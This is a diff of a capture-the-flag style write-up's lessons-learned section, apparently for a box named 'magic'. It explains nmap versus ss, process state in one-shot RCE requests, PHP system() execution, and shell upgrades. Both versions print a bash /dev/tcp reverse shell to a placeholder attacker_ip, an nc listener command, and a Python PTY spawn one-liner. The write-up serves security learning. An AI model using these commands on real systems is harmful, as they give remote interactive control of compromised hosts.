@@ -234,49 +234,53 @@ When I executed the privileged `/bin/sysinfo` binary, it searched the modified `
 
 ---
 
-### 🧠 Deep-Dive Lessons Learned
+#  🧠 What I Have Learnt:
 
-#### 1. Network Visibility: External vs. Internal Scanning
-*   **`nmap` (External):** Used to discover externally reachable services and open ports. It maps what a remote attacker can see and interact with over the network.
-*   **`ss` / `netstat` (Internal):** Used locally on the compromised machine to list all active network connections and listening sockets. It reveals internal-only services (like a database bound to `127.0.0.1:3306`) that are shielded from external `nmap` scans.
+1. **Difference Between Nmap and SS**
+   * Nmap is used to scan for externally reachable services/ports which an attacker can connect to and control remotely over the network.
+   * On the other hand, ss is used to list out all the services that are connected internally of a machine. 
 
-#### 2. Process-Local State & Filesystem Persistence
-When executing commands via an web-based Remote Command Execution (RCE) vulnerability, each request triggers a separate, short-lived operating system process:
-*   **Isolated Environments:** Every time a one-shot RCE payload is sent, the web server spawns a brand new process. This process always initializes from the web server's default working directory (e.g., `/var/www/magic/images`).
-*   **Process Lifecycle Examples:**
-    *   **Payload A (`cd /var/www/magic`):** Spawns Process A $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ Process A exits. The directory change is lost.
-    *   **Payload B (`cd /var/www/magic && ls -lah`):** Spawns Process B $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ lists files $\rightarrow$ Process B exits.
-    *   **Payload C (`cd /var/www/magic && touch test`):** Spawns Process C $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ creates the file `test` $\rightarrow$ Process C exits.
-*   **Filesystem vs. Process State:** While process states (like current working directories or environment variables) disappear when a process exits, filesystem modifications are persistent. The operating system does not "forget" structural changes; therefore, the `test` file remains on disk long after Process C terminates.
+2. **Process Local State**
+   * I understand better about process local state.
+   * When a command via RCE reaches the web server as an HTTP request, the web server will then take it as a process.
+   * This process will begin to run from the default working directory.
+   * As the process is running, the supplied command will be executed.
+   * After the supplied command is executed, the process ends.
+   * *Example A:* A command, `cd /var/www/magic`, is sent via RCE. It will reach the web server as an HTTP request. Then, the web server will take it as a process, process A. When it is executed in the OS, process A will start from the default working directory from how the web app/server launches them (`/var/www/magic/images` as an example), then the process will change directory to the `/var/www/magic` directory, then the process is done. 
+   * *Example B:* Another new command, `cd /var/www/magic && ls -lah`, is sent via RCE. This command is another new process, process B. When executed in the OS, it will start from the default working directory, `/var/www/magic/images`, then the process will change directory to `/var/www/magic` and list all the files and directories, then the process ends. 
+   * *Example C:* Another new command, `cd /var/www/magic && touch test`, is sent via RCE. This command is a new process, process C. When executed in the OS, it will start from the default working directory, `/var/www/magic/images`, then the process will change directory to `/var/www/magic` and create a file called test, then the process ends. 
+   * *Filesystem Persistence:* Besides, I also learnt that Linux itself does not 'forget' things. Continuing from the example command, `cd /var/www/magic && touch test`, even though the process ends and exits, the created file, test, will still remain because the filesystem itself was modified persistently.
 
-#### 3. Execution Layers: PHP Interpreter vs. System Calls
-*   **The Interpreter Layer:** After a file bypasses upload filters, the web server evaluates its extension. If configured to do so, it routes the file to the PHP interpreter. Code like `<?php echo "HELLO"; ?>` is processed entirely within the runtime environment of the PHP engine, which outputs the text back to the server response.
-*   **The OS Layer via `system()`:** If the code contains a system execution function like `system()`, `exec()`, or `passthru()`, the PHP interpreter breaks out of its application sandbox. It requests the underlying operating system to spawn a shell (typically `/bin/sh`) and execute the raw Linux commands passed inside the function's arguments.
+3. **PHP Interpreter vs. system()**
+   * I understand the difference between the PHP interpreter and `system()`.
+   * After a file is successfully uploaded, the web server will follow the configuration and decide whether the file will be routed to the PHP interpreter.
+   * If it routes to the PHP interpreter, then the interpreter will follow the handler rules, and decide whether the PHP payload in the file will be executed.
+   * A PHP payload such as `<?php echo "HELLO"; ?>` will be interpreted and show the output, `HELLO`.
+   * If there is a function `system()` inside the payload, then the PHP interpreter will execute that `system()` function, and the `system()` function will then ask the operating system to execute the supplied command inside the `system()`.
 
-#### 4. Mechanics of a Reverse Shell Payload
-A reverse shell changes the communication flow from unstable, stateless HTTP requests to a continuous, interactive session:
-*   **The Listener:** The attacker first sets up a local network listener using Netcat: `nc -lnvp <port_number>`.
-*   **The Redirection Payload:** The attacker triggers a payload on the target, such as:
-    ```bash
-    bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port_number> 0>&1'
-    ```
-*   **Data Stream Breakdown:**
-    *   `bash -i`: Spawns an interactive shell instance on the target.
-    *   `>& /dev/tcp/...`: Redirects the standard output (`stdout`) and standard error (`stderr`) streams of that shell across a TCP connection back to the attacker's listening machine.
-    *   `0>&1`: Ties standard input (`stdin`) to the exact same TCP socket descriptor. This ensures that any keystrokes typed into the attacker's terminal travel forward through the network stream to feed directly into the target's shell input.
-*   **Persistence:** Because this network socket connection and its associated shell process remain active, the attacker can execute commands interactively without generating new HTTP request/response loops.
+4. **Reverse Shell Payloads**
+   * I have learnt about the reverse shell payload.
+   * At first, the attacker needs to start a listener by executing `nc -lnvp <port number>` on his own terminal.
+   * Then, the attacker needs to upload the reverse shell payload, `bash -c 'bash -i >& /dev/tcp/attacker_ip/port_number 0>&1'`, via RCE to the target terminal.
+   * This payload basically means establish a TCP connection with the listener, then the output from the target's interactive shell will be redirected through that TCP connection, so the shell output is sent to the attacker’s netcat listener and displayed in the attacker terminal.
+   * At the same time, the `0>&1` part makes stdin use the same communication channel as stdout, so keyboard input from the attacker side can travel back through the TCP connection into the target shell.
+   * The reverse shell payload is important and useful because as long as the bash shell process remains alive and attached to the same TCP connection, the attacker can continuously type commands and receive output interactively instead of sending separate one-shot HTTP requests.
 
-#### 5. Interactive Upgrades using Pseudo-Terminals (PTY)
-*   **Raw Connection Constraints:** Standard reverse shells run over raw network streams and lack standard terminal features. Interactive programs (like `su`, `ssh`, or `vim`) will fail because they require a controlling terminal interface to enter passwords or draw text UI elements.
-*   **The PTY Fix:** Running the following Python wrapper simulates a valid terminal interface in software:
-    ```python
-    python3 -c 'import pty; pty.spawn("/bin/bash")'
-    ```
-    This tricks the operating system into treating the network socket connection like a physical terminal device, granting full interactive software compatibility.
+5. **Pseudo-TTY Upgrade**
+   * I also learnt about some new commands or payloads.
+   * The command `python3 -c 'import pty;pty.spawn("/bin/bash")'` is used so that the shell process can be run in a pseudo tty.
+   * A PTY is a software-simulated terminal that allows the shell to run as if in a real terminal.
+   * This gives a better interactive behaviour. 
 
-#### 6. Vulnerabilities vs. Post-Exploitation Mechanics
-*   **The Transport Channel:** A reverse shell is **not** a security vulnerability. It is merely a post-exploitation transport mechanism—a network connection that forwards terminal inputs and outputs across a persistent network channel.
-*   **The Root Flaw:** The actual security vulnerability on this machine is Remote Command Execution (RCE), driven by insufficient file upload validation and poor input sanitation. This structural weakness allowed arbitrary text files containing executable backend scripts to enter the web root and get parsed by the language engine.
+6. **Vulnerability vs. Mechanism**
+   * I also understand that a reverse shell itself is not a vulnerability.
+   * A reverse shell simply means that a persistent TCP connection is established between the attacker's listener and the target shell process.
+   * The attacker's keyboard input can be transported via that TCP connection and reaches the target shell process to be executed.
+   * Also, the output from the target's shell process uses the same communication channel to reach the attacker listener and display on the attacker screen.
+   * The real vulnerability is RCE.
+   * The attacker's input command can successfully reach the web server as an HTTP request, then routes to the interpreter and be executed.
+   * This can be done due to the weak or insufficient validation by the server.
+
 
 
 ---
